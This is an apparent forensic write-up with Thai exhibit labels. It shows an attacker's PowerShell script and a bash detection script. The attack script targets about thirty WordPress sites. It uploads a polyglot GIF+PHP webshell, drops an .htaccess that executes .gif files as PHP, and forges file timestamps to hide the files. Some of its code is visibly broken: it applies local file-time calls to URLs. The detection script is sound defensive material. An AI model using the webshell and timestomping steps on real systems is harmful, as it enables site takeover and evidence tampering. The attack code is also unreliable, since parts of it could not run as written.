🔍 หลักฐานที่ 1: deploymf.ps1 Script

📄 deploymf.ps1▶
# PowerShell Deployment Script
# Source: 192.168.2.45
# Deployed to: 30+ WordPress sites

$targets = @(
    "http://192.168.11.10/wp-content/uploads/",
    "http://192.168.11.11/wp-content/uploads/",
    "http://192.168.11.12/wp-content/uploads/",
    "http://192.168.11.13/wp-includes/",
    "http://192.168.11.14/wp-content/themes/",
    # ... 25+ more WordPress targets
    "http://192.168.11.35/wp-content/uploads/"
)

foreach ($target in $targets) {
    # Upload polyglot GIF+PHP webshell
    $webshell = Get-Content "news_th-.gif" -Raw
    Invoke-WebRequest -Uri "$target" -Method POST `
        -Form @{file=@{Content=$webshell; FileName="news_th-.gif"; ContentType="image/gif"}}

    # Deploy .htaccess to enable PHP execution in uploads
    $htaccess = @"
    AddType application/x-httpd-php .gif
    AddHandler php-script .gif
    php_flag engine on
    "@
    Invoke-WebRequest -Uri "$target" -Method POST `
        -Form @{file=@{Content=$htaccess; FileName=".htaccess"}}

    # Timestomp deployed files
    $original = Get-Item "$target/branding.gif"
    [System.IO.File]::SetCreationTime("$target/news_th-.gif", $original.CreationTime)
    [System.IO.File]::SetLastWriteTime("$target/news_th-.gif", $original.LastWriteTime)
}

Write-Host "Deployed webshells to $($targets.Count) sites"

🔍 หลักฐานที่ 4: Timestomp Detection

📄 timestomp_detection.sh▶
#!/bin/bash
# Detect timestomping by comparing MAC times
# Modified time vs inode change time vs creation time

find /var/www/html -name "*.gif" -newer /etc/hostname | while read f; do
    mtime=$(stat -c %Y "$f")        # modification time
    ctime=$(stat -c %Z "$f")        # inode change time
    if [ "$mtime" -ne "$ctime" ]; then
        echo "TIMESTOMPED: $f"
        echo "  mtime: $(date -d @$mtime)"
        echo "  ctime: $(date -d @$ctime)"
    fi
done

# Results:
# TIMESTOMPED: /wp-content/uploads/2026/07/news_th-.gif
#   mtime: 2025-03-15 10:22:33 (forged)
#   ctime: 2026-07-12 14:35:12 (actual creation)

# TIMESTOMPED: /wp-content/uploads/2026/07/.htaccess
#   mtime: 2025-03-15 10:22:33 (forged)
#   ctime: 2026-07-12 14:35:45 (actual creation)
